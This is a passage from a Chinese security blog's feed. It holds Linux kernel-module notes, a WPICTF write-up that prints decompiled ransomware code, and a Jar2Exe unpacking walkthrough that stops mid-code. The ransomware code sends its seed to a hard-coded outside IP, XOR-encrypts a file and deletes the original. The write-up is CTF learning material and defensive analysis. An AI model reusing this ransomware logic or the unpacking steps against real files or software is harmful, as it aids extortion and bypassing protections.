        <content type="html"><![CDATA[<html><head></head><body><p>最近有想深入驱动和内核的想法，所以开始学习<em>ldd3</em>，参考着写一篇学习笔记</p><span id="more"></span><h4 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h4><h5 id="什么是驱动"><a href="#什么是驱动" class="headerlink" title="什么是驱动"></a>什么是驱动</h5><p>驱动在Linux内核中担任着特殊的角色，像是一个黑箱，隐藏掉设备工作的具体细节，并且具有模块化的特点，可以和内核的其他部分分开编译，并且可以随时装载卸载。</p><blockquote><p>the role of a device driver is providing mechanism, not policy</p></blockquote><p><em>mechanism</em>指的是提供什么样的方法，<em>policy</em>指的是这些方法可以怎样使用，将这两个问题分开解决，用程序不同的部分甚至是不同的程序去实现，可以使开发变得更简单。</p><p>书中举了一个很简单的例子可以帮助很好的理解，Linux图形界面显示就可以分为两部分，一部分是X Server用以驱动显卡并给替它程序提供接口，另一部分就是我们比较熟悉的窗口管理器(比如我现在用的gnome-session)，在之前安装arch linux的时候有很深的体会。</p><blockquote><p>When writing drivers, a programmer should pay particular attention to this fundamental concept: write kernel code to access the hardware, but don’t force particular policies on the user, since different users have different needs.</p></blockquote><p>这句话很关键，驱动程序只需要提供调用硬件的接口就可以了，并且越是<em>policy free</em>就越有利于实现应用可以在不同的环境下运行</p><h5 id="内核浅析"><a href="#内核浅析" class="headerlink" title="内核浅析"></a>内核浅析</h5><p>在Unix系统中，进程会请求很多系统资源，比如cpu算力，内存，网络或者是其他资源，内核，简单来说，就是一堆可执行的代码，负责管理这些请求。内核大致可以分为以下几个部分：</p><ul><li><p>进程管理</p><p>管理创建和销毁进程，进程之间的通信或者是cpu的分配</p></li><li><p>内存管理</p><p>内存管理其负责为程序分配虚拟内存</p></li><li><p>文件系统</p><p>以前看过这样一句话，几乎Unix系统中的一切都可以当作文件来看</p></li><li><p>设备控制</p><p>提供驱动管理，就是目前学习的重点</p></li><li><p>网络</p></li></ul><h5 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h5><blockquote><p>Each piece of code that can be added to the kernel at runtime is called a module.</p></blockquote><p>模块可以通过<code>insmod</code>装载并且可以通过<code>rmmod</code>卸载</p><p>模块也有很多种类，但分类的方式并不绝对，本书中分为了三类</p><ul><li><em>a char module</em></li><li><em>a block module</em></li><li><em>a network module</em></li></ul><p>内核中的各种功能，无论是硬件还是软件，都是模块化的</p><h5 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h5><p>如果内核存在安全漏洞，整个系统就是不安全的。系统通过调用<em>init_module</em>来检测用户是否有权限，也只有有权限的用户才可以装载模块</p><h4 id="从hello-world开始"><a href="#从hello-world开始" class="headerlink" title="从hello world开始"></a>从hello world开始</h4><p>第一个程序惯例从<code>hello world</code>开始，先写一个很简单的程序，即使没有任何内核基础也能看出大概意思来</p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//hello.c</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line">MODULE_LICENSE(<span class="hljs-string">"Dual BSD/GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hello_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>{</span><br><span class="line">    printk(KERN_ALERT<span class="hljs-string">"Hello,world\n"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hello_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>{</span><br><span class="line">    printk(KERN_ALERT<span class="hljs-string">"Goodbye,cruel world\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></tbody></table></figure><p>这个模块定义了两个函数，一个在模块载入(通过<code>module_init</code>加载)的时候调用，一个在模块卸载(通过<code>module_exit</code>加载)的时候调用，<code>module_init</code>和<code>module_exit</code>是指定函数作用的两个宏定义。另外一个宏定义就是<code>MODULE_LICENSE</code>，这里用来指定的是<code>free license</code>，没有<code>license</code>的模块在装载的时候会因为安全问题被禁用，导致装载失败。</p><p><code>printk</code>顾名思义就是打印，很像<code>printf</code>，但是是打印在<code>log</code>里，可以使用<code>dmesg</code>命令查看。</p><blockquote><p>注意在make的之前要先安装<code>linux-header</code>，我的环境是<code>kali</code>，使用的命令时是</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-$(uname -r)</span><br></pre></td></tr></tbody></table></figure></blockquote><p><code>Makefile</code>如下</p><figure class="highlight makefile hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">ifeq</span> (<span class="hljs-variable">$(KERNELRELEASE)</span>,)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment"># Assume the source tree is where the running kernel was built</span></span><br><span class="line">    <span class="hljs-comment"># You should set KERNELDIR in the environment if it's elsewhere</span></span><br><span class="line">    KERNELDIR ?= /lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build</span><br><span class="line">    <span class="hljs-comment"># The current directory is passed to sub-makes as argument</span></span><br><span class="line">    PWD := <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-section">modules:</span></span><br><span class="line"><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KERNELDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">modules_install:</span></span><br><span class="line"><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KERNELDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="hljs-section">clean:</span></span><br><span class="line">rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions Module.symvers modules.order</span><br><span class="line"></span><br><span class="line"><span class="hljs-meta"><span class="hljs-meta-keyword">.PHONY</span>: modules modules_install clean</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-comment"># called from kernel build system: just declare what our modules are</span></span><br><span class="line">    obj-m := hello.o</span><br><span class="line"><span class="hljs-keyword">endif</span></span><br></pre></td></tr></tbody></table></figure><p><code>make</code>成功之后使用<code>sudo insmod hello.ko</code>加载模块，使用<code>sudo rmmod hello.ko</code>卸载模块，之后可以使用<code>sudo dmesg</code>查看打印出来的信息</p><p><img src="/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/hello.png" alt="hello"></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux驱动 </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WPICTF-re-wp</title>
      <link href="/2020/04/20/WPICTF-re-wp/"/>
      <url>/2020/04/20/WPICTF-re-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这次的比赛只有两道re，全都是malware，不难，也还挺有意思</p><span id="more"></span><h4 id="danger-Live-and-Malicious-Code"><a href="#danger-Live-and-Malicious-Code" class="headerlink" title="danger-Live-and-Malicious-Code"></a>danger-Live-and-Malicious-Code</h4><p>病毒的代码里面混进了flag，js的语法也不是特别懂，发现了很多处理字符串的函数，所以干脆<code>console.log</code>都输出了出来，发现输出的<code>url</code>中间夹了flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">WPI</span><span class="hljs-template-variable">{Oh_nose_procoding_detected}</span></span><br></pre></td></tr></tbody></table></figure><h4 id="NotWannasigh"><a href="#NotWannasigh" class="headerlink" title="NotWannasigh"></a>NotWannasigh</h4><p>首先看下<code>ransom note</code></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Haha! Your precious file flag.gif has been <span class="hljs-keyword">encrypted</span> <span class="hljs-keyword">by</span> my <span class="hljs-built_in">new</span> <span class="hljs-keyword">and</span> improved ransomware NotWannasigh! You must send bitcoin <span class="hljs-keyword">to</span> "bitpay.com/83768" <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the decryption key. You should act fast because <span class="hljs-keyword">in</span> <span class="hljs-number">48</span> hours I will <span class="hljs-keyword">delete</span> the key. Muahahahaha!</span><br><span class="line"> - def-<span class="hljs-keyword">not</span>-h4ckah</span><br><span class="line"></span><br><span class="line">(Hi, CTF challenge creator here. You should _NEVER_ pay the ransom. <span class="hljs-keyword">If</span> you send bitcoin <span class="hljs-keyword">to</span> that BTC wallet <span class="hljs-keyword">then</span> you will <span class="hljs-keyword">ONLY</span> be donating <span class="hljs-keyword">to</span> charity (<span class="hljs-keyword">and</span> hey, that<span class="hljs-string">'s really nice of you, Mental Health Hackers is a great organization). I will NOT send you the decryption key)</span></span><br></pre></td></tr></tbody></table></figure><p>题目中所给的<code>flag-gif.EnCiPhErEd</code>应该就是加密过的文件，解密就可以得到flag，给的流量包暂时不知道作用是什么，干脆先看看程序的实现</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)seed = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);</span><br><span class="line">  <span class="hljs-built_in">srand</span>(seed[<span class="hljs-number">0</span>]);</span><br><span class="line">  fd = <span class="hljs-built_in">socket</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( fd == <span class="hljs-number">-1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"could not create socket"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"created socket"</span>);</span><br><span class="line">    *(_DWORD *)&amp;addr.sa_data[<span class="hljs-number">2</span>] = <span class="hljs-built_in">inet_addr</span>(<span class="hljs-string">"108.61.127.136"</span>);</span><br><span class="line">    addr.sa_family = <span class="hljs-number">2</span>;</span><br><span class="line">    *(_WORD *)addr.sa_data = <span class="hljs-built_in">htons</span>(<span class="hljs-number">0x50</span>u);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">connect</span>(fd, &amp;addr, <span class="hljs-number">0x10</span>u) &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"connected"</span>);</span><br><span class="line">      <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"%d"</span>, *(_QWORD *)seed);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">send</span>(fd, &amp;s, <span class="hljs-number">0xA</span>uLL, <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span> )</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"sent"</span>);</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"send failed"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"connect error"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>先根据当前时间生成了一个随机数种子，然后进行通信，把这个种子发给了一个ip，这个种子肯定是后面生成随机数用的，所以肯定是有用的，这也就是流量包的作用，根据流量信息可以获得这个随机数种子的值<code>1585599106</code></p><p>下面生成了一个随机数序列</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"targetting flag.gif"</span>);</span><br><span class="line">stream = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag.gif"</span>, <span class="hljs-string">"r+"</span>);</span><br><span class="line"><span class="hljs-built_in">fseek</span>(stream, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>);</span><br><span class="line">v19 = <span class="hljs-built_in">ftell</span>(stream);</span><br><span class="line"><span class="hljs-built_in">fseek</span>(stream, <span class="hljs-number">0LL</span>, <span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"fileSize = %d\n"</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v19);</span><br><span class="line">v18 = v19 - <span class="hljs-number">1LL</span>;</span><br><span class="line">v8 = v19;</span><br><span class="line">v9 = <span class="hljs-number">0LL</span>;</span><br><span class="line">v3 = <span class="hljs-built_in">alloca</span>(<span class="hljs-number">16</span> * ((v19 + <span class="hljs-number">15LL</span>) / <span class="hljs-number">0x10</span>uLL));</span><br><span class="line">v17 = &amp;v6;</span><br><span class="line"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v19; ++i )</span><br><span class="line">  *((_BYTE *)v17 + i) = <span class="hljs-built_in">rand</span>();</span><br><span class="line"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"key generated by 256"</span>);</span><br></pre></td></tr></tbody></table></figure><p>生成了key，下面是加密过程</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; ; ++j )</span><br><span class="line">  {</span><br><span class="line">    v14 = <span class="hljs-built_in">fgetc</span>(stream);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( j &gt;= v19 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    *((_BYTE *)v15 + j) = v14 ^ *((_BYTE *)v17 + j);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">fclose</span>(stream);</span><br><span class="line">  <span class="hljs-built_in">remove</span>(<span class="hljs-string">"flag.gif"</span>);</span><br><span class="line">  v13 = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"flag-gif.EnCiPhErEd"</span>, <span class="hljs-string">"w+"</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; v19; ++k )</span><br><span class="line">    <span class="hljs-built_in">fputc</span>(*((<span class="hljs-keyword">unsigned</span> __int8 *)v15 + k), v13);</span><br><span class="line">  <span class="hljs-built_in">fclose</span>(v13);</span><br></pre></td></tr></tbody></table></figure><p>简单异或之后写入文件，所以生成随机数序列之后再异或回来就好了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-built_in">srand</span>(<span class="hljs-number">1585599106</span>);</span><br><span class="line">    FILE *s = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"../flag-gif.EnCiPhErEd"</span>, <span class="hljs-string">"r"</span>);</span><br><span class="line">    <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;</span><br><span class="line">    FILE *f = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">"../flag.gif"</span>, <span class="hljs-string">"w+"</span>);</span><br><span class="line">    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(s))</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">int</span> uVar1 = <span class="hljs-built_in">rand</span>()&amp;<span class="hljs-number">0xff</span>;</span><br><span class="line">        <span class="hljs-keyword">int8_t</span> tmp2=<span class="hljs-built_in">fgetc</span>(s);</span><br><span class="line">        <span class="hljs-keyword">int8_t</span> tmp = uVar1 ^ tmp2;</span><br><span class="line">        <span class="hljs-built_in">fputc</span>(tmp, f);</span><br><span class="line">        index = (<span class="hljs-keyword">int32_t</span>)index + <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-built_in">fclose</span>(s);</span><br><span class="line">    <span class="hljs-built_in">fclose</span>(f);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个脚本要在linux下跑，因为win的随机数生成的不一样</p><p>得到了含有flag的gif</p><p><img src="/2020/04/20/WPICTF-re-wp/flag.gif" alt="flag"></p><p>flag有点难读，第一遍还读错了一位</p><figure class="highlight autohotkey hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPI{It_always_feels_<span class="hljs-built_in">a_little</span>_weird_writing_malware}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> WPICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fibonacci-JavisOJ-wp</title>
      <link href="/2020/04/01/Fibonacci-JavisOJ-wp/"/>
      <url>/2020/04/01/Fibonacci-JavisOJ-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这题涉及到<code>jar2exe</code>的知识，所以单独拿出来写一下，顺便写一写<code>jar2exe</code>怎么入手</p><span id="more"></span><blockquote><p>这种方法并不适用于<code>jar2exe</code>当前的最新版(2.1.7)，经过我的测试2.1.2试可用的，而且由于2.1.2的第三种加密方式还没有这么激进，后续其它版本应该也是支持的，还需要再试验。</p></blockquote><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>拿到题目<code>DIE</code>查一下，发现不是一个普通的可执行文件</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/1.png" alt="1"></p><p>也就是说这本来是一个<code>jar</code>文件，通过<code>jar2exe</code>的方式转换成了windows可执行文件</p><h4 id="Jar2Exe"><a href="#Jar2Exe" class="headerlink" title="Jar2Exe"></a>Jar2Exe</h4><p>一共有3种保护方式</p><ul><li>不隐藏也不加密</li><li>隐藏</li><li>隐藏且加密</li></ul><h5 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h5><p>第一种方式非常简单，只需要在16进制编辑器中找到第一个<code>PK</code>，即<code>zip</code>的文件头，然后把这之后的另存为新文件，就可以了。但是这一题并不是采用这种方式，以这种方式提取出来的程序只包含很多生成出来的附加文件。</p><p><del>其实也可以直接用<code>winrar</code>打开</del></p><h5 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h5><p>第二种方式隐藏了原本的<code>jar</code>文件，可以通过<code>RH</code>来查看文件，这部分被放在了<code>RCData</code>里</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/2.png" alt="1"></p><h5 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h5><p>本题采用的是第三种，就像第二种一样，原先的<code>jar</code>文件被隐藏了，但是第三种方式还进行加密，并且将整个<code>jar</code>文件的结构和类名全部都混淆了(经过实验在<code>jar2exe 2.1.2</code>中并不会对文件结构进行破坏)，不会像第二种方式中直接<code>dump</code>出来一个完整的<code>jar</code>文件</p><h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p>要解决这道题首先就是要把有效的代码<code>Dump</code>出来，这部分的内容对于第二种和第三种方式是基本一样的。</p><p>从上面可以看到这段密文的偏移，然后<code>x64dbg</code>打开之后，在程序内存处根据偏移找到这段内存，设内存访问断点，程序运行起来，在<code>dec r8d</code>处停下来，此时如果是采用第二种方式加密，经过一个简单的循环之后就可以把原<code>jar</code>给<code>dump</code>出来，但是这里还需要经过一些加密</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/3.png" alt="3"></p><p>根据脱壳的经验，找到向上跳转的最外层，就是最后一个跳转，然后直接执行到下一行</p><p><img src="/2020/04/01/Fibonacci-JavisOJ-wp/4.png" alt="4"></p><p>首先观察变红色的值即发生改变的值，发现<code>r14</code>和<code>r15</code>的值很可疑，观察前面的代码，发现会在循环处<code>inc r15d</code>和<code>inc r14</code>，根据这两个寄存器的值推断，<code>r14</code>中的值是解密后数据的结束位置，<code>r15</code>中的值<code>B8B</code>为解密后数据的长度，因此，利用<code>Scylla</code>把这部分内容<code>dump</code>出来，出题人使用的<code>jar2exe</code>版本里面的文件名都是混淆过的，需要手动修复成<code>jar</code>文件，找到其中的两个<code>class</code>文件，<code>IDEA</code>直接就可以反编译。</p><h4 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h4><p><code>dump</code>出来的文件包含了两个类，第一个类包含主要的处理过程</p><figure class="highlight java hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="hljs-comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="hljs-comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">package</span> top.phrack.ctf.Fibonacci;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Fibonacci</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Fibonacci</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heheda</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">        String bb = <span class="hljs-keyword">new</span> String(b.x);</span><br><span class="line">        String cb = <span class="hljs-keyword">new</span> String(b.y);</span><br><span class="line">        hello(cb, bb);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        System.out.println(<span class="hljs-string">"来让我们玩一个数列游戏："</span>);</span><br><span class="line">        System.out.println(<span class="hljs-string">"a[0]=0,a[1]=1"</span>);</span><br><span class="line">        System.out.println(<span class="hljs-string">"a[2]=1,a[3]=2"</span>);</span><br><span class="line">        System.out.println(<span class="hljs-string">"a[4]=3,a[5]=5"</span>);</span><br><span class="line">        System.out.println(<span class="hljs-string">".............."</span>);</span><br><span class="line">        System.out.println(<span class="hljs-string">"请计算a[100000000000000]："</span>);</span><br><span class="line">        Scanner scan = <span class="hljs-keyword">new</span> Scanner(System.in);</span><br><span class="line">        String read = scan.nextLine();</span><br><span class="line">        System.out.println(<span class="hljs-string">"答案错误！！"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">hello</span><span class="hljs-params">(String aaa, String bbb)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">int</span>[] iS = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">256</span>];</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] iK = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">256</span>];</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">int</span> j;</span><br><span class="line">        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; iS[j] = j++) {</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">int</span> j = <span class="hljs-keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">short</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; ++i) {</span><br><span class="line">            iK[i] = (<span class="hljs-keyword">byte</span>)bbb.charAt(i % bbb.length());</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        j = <span class="hljs-number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span 